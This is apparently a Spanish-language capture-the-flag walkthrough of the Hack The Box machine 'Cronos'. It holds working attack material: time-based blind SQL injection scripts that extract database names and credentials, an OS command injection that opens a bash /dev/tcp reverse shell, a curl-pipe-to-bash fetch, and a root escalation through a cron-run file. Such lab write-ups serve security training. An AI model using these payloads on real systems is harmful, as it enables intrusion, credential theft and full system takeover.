# 10.10.10.13 - Cronos
![Cronos](https://user-images.githubusercontent.com/96772264/209541813-8ad744da-9a58-4408-9570-9e48ffae3ca1.png)

----------------------
# Part 1: Reconocimiento

Puertos abiertos 22(ssh), 53(dns), 80(http)
```whatweb http://10.10.10.13/ # -> Apache[2.4.18]```

Como está el puerto 53 abierto (DNS) se pueden hacer unas cuantas consultillas...
```console
└─$ nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb

└─$ dig @10.10.10.13 cronos.htb ns # Nada interesante
└─$ dig @10.10.10.13 cronos.htb mx # Tampoco
└─$ dig @10.10.10.13 cronos.htb axfr
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
```
Antes de entrar en la web nos encargamos del reconocimiento...
```console
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://cronos.htb/FUZZ/
000000536:   200        16 L     58 W       925 Ch      "css"  
000000939:   200        16 L     59 W       924 Ch      "js"   
000000069:   403        11 L     32 W       291 Ch      "icons"

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://cronos.htb/FUZZ.php
000000001:   200        85 L     137 W      2319 Ch     "index"

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://admin.cronos.htb/FUZZ.php
000000001:   200        56 L     139 W      1547 Ch     "index"
000001211:   302        0 L      0 W        0 Ch        "logout"
000001476:   200        0 L      0 W        0 Ch        "config"
000000244:   302        20 L     38 W       439 Ch      "welcome"
000009506:   302        0 L      0 W        0 Ch        "session"
```
-----------------------------
# Part 2: Blind SQLI

La web de cronos.htb tiene muchos enlaces a sitios externos (todos relacionados con laravel) nada mas... Arrastra la cookie XSRF-TOKEN y laravel_session...  
![cronos1](https://user-images.githubusercontent.com/96772264/209541970-f5983542-e193-4a0c-9d7b-3362b984d057.PNG)

En admin.htb nos sale un panel de login. SI ponemos admin:admin nos dice "Invalid Username or Password" por lo que descartamos la fuerza bruta con Hydra!  
[cronos2](https://user-images.githubusercontent.com/96772264/209542000-388e443f-968d-416a-9013-bd4abeb061ee.PNG)

En cambio funciona la inyeccion sql más básica del mundo... ```admin' or 1=1```  
Acabamos en una sección donde el sistema ejecuta un ping, ya con eso pensamos en un OS command injection, pero antes vamos a exprimir la base de datos...  

Funciona la sqli basada en tiempo -> ```admin' and sleep(5)-- -```

--------------------------------------
## EL nombre de la base de datos actual

La primera inyección sería así:
```
"Si la primera letra de la base de datos actual es una "a" espera 2 segundos"
"admin' and if(substr(database(),1,1)='a',sleep(2),1)-- -" 
```
Por lo que la idea sería crear un script que iterara por cada letra por cada posicion... 

```python
#!/usr/bin/python3
import requests, time, string

caracteres = string.ascii_lowercase
url = "http://admin.cronos.htb/"
print("Base de datos actual: ")
resultado = ""
for pos in range(20):
    for letra in caracteres:
        sqli = "' and if(substr(database()," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
        data = { "username": "admin" + sqli, "password":"test"}
        inicio = time.time()
        req = requests.post(url, data=data)
        final = time.time()
        if final - inicio > 2:
            resultado += letra
            print(resultado)
            break
```

La base de datos en uso es "admin"

---------------------------
## EL nombre del resto de bases de datos

Ahora toca sacar todas las bases de datos...
```
' and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)='a',sleep(2),1)-- -
# El nuevo bucle "for i in range -> limit" itera por cada base de datos
```
```python
caracteres = string.ascii_lowercase + "_"
url = "http://admin.cronos.htb/"
print("Bases de datos: ")
resultado = ""
for i in range(10):
	for pos in range(20):
		for letra in caracteres:
			sqli = "' and if(substr((select schema_name from information_schema.schemata limit " + str(i) + ",1)," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
			data = { "username": "admin" + sqli, "password":"test"}
			inicio = time.time()
			req = requests.post(url, data=data)
			final = time.time()
			if final - inicio > 2:
				resultado += letra
				print(resultado)
				break
	resultado += ", "
```
Las bases de datos son "information_schema" y "admin".

---------------------

## Las tablas de "admin"

Repetimos el script anterior, solo que cambia la inyección
```
sqli = "' and if(substr((select table_name from information_schema.tables where table_schema ='admin' limit " + str(i) + ",1)," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"

## admin' and if(substr((select table_name from information_schema.tables where table_schema ='admin' limit 1,1),1,1)="a", sleep(2),1)-- -
```
La única tabla que encontramos es users

----------------------
## Las columnas de "users"

Al igual que con las tablas, solo hace falta cambiar la query

```console
sqli = "' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit " + str(i) + ",1)," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"

# sqli = "' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit 1,1),1,1)='a',sleep(2),1)-- -"
```
Las columnas son "id, username, password"

-------------------
## Las creds

La nueva query
```
sqli = "' and if(substr((select group_concat(username,0x3a,password) from users limit " + str(i) + ",1)," + str(pos) + ",1)='" + letra + "',sleep(1),1)-- -" 

# admin' and if(substr((select group_concat(username,0x3a,password) from users limit 1,1),1,1)='a',sleep(1),1)-- -
```
Las creds son: admin:4f5fffa7b2340178a716e3832451e058 El problema esque ni con crackstation lo podemos romper...   
Antes vamos a ver que tipo de hash es ```hashid "4f5fffa7b2340178a716e3832451e058" -> MD5```  
Pero si en esta [web](https://www.md5online.org/md5-decrypt.html) ```1327663704```  


-----------------------------
# Part 3: OS Command Injection

La web nos permite hacer ping a un IP.  
![cronos4](https://user-images.githubusercontent.com/96772264/209542048-c144dd56-0506-421a-a916-82dd03ef93fa.PNG)

```
/POST http://admin.cronos.htb/welcome.php 
Cookie PHPSESSID=dq20k35860jpm19rv1jtl2j353 
command=ping+-c+1&host=10.10.14.16
```
```console
└─$ curl -s -X POST -H "Cookie: PHPSESSID=dq20k35860jpm19rv1jtl2j353" \
-d "command=ping -c 1&host=10.10.14.16"  http://admin.cronos.htb/welcome.php | html2text
****** Net Tool v0.1 ******
[One of: traceroute/ping] [8.8.8.8             ] [Execute!]
PING 10.10.14.16 (10.10.14.16) 56(84) bytes of data.
64 bytes from 10.10.14.16: icmp_seq=1 ttl=63 time=45.4 ms

--- 10.10.14.16 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.486/45.486/45.486/0.000 ms
Sign_Out

└─$ sudo tcpdump -i tun0 icmp -n
11:08:20.328767 IP 10.10.10.13 > 10.10.14.16: ICMP echo request, id 1434, seq 1, length 64
11:08:20.328816 IP 10.10.14.16 > 10.10.10.13: ICMP echo reply, id 1434, seq 1, length 64
```

Hace un comando de bash "ping" El problema cuando una web le manda un comando al sistema esque podemos jugar con eso, como el navegdor está limitado,
herramientas como curl permiten mas flexibilidad para meter cosas.  

En este caso concatenamos un segundo comando: ```-d "command=ping -c 1; curl http://10.10.14.16&host=10.10.14.16"```  
SI levantamos un servidor con el python ```sudo python3 -m http.server 80``` recibimos una petición.  

```console
└─$ curl -s -X POST -H "Cookie: PHPSESSID=dq20k35860jpm19rv1jtl2j353" \
-d "command=ping -c 1; bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/443 0>%261' &host=10.10.14.16"  http://admin.cronos.htb/welcome.php | html2text
```
-----------------------------
# Part 4: En el sistema

Ya con eso entramos en el sistema. Antes de enumerar está bien mirar por las carpetas actuales:
```console
www-data@cronos:/var/www/admin$ ls
config.php  index.php  logout.php  session.php	welcome.php
www-data@cronos:/var/www/admin$ cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>

www-data@cronos:/var/www/admin$ mysql -uadmin -pkEjdbRigfBHUREiNSDs
mysql> show databases; # admin e information_schema
```
Pero las bases de datos que nos salen son las que vimos con la inyección de tiempo que hicimos antes:  
- Usarios: noulis y root (nosotros somos www-data). Podemos acceder a la user.txt de noulis 

Hay una tarea cron corriendo:
```* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1```
```console
www-data@cronos:/tmp$ curl http://10.10.14.16/procmon.sh | bash
> /usr/sbin/CRON -f
> /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
> php /var/www/laravel/artisan schedule:run
< /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

Root ejecuta con php el artisan este (es el script de arranque de laravel):  
```console
www-data@cronos:/var/www/admin$ cat /var/www/laravel/artisan
<?php (...)
www-data@cronos:/var/www/admin$ ls -l /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```
Como hay permisos de escritura, se puede añadir al principio (despues de las cabeceras php) esta linea  ```system("chmod u+s /bin/bash");``` (Hacer SUID a la bash)
```console
www-data@cronos:/var/www/admin$ bash -p
bash-4.3# whoami
root
```
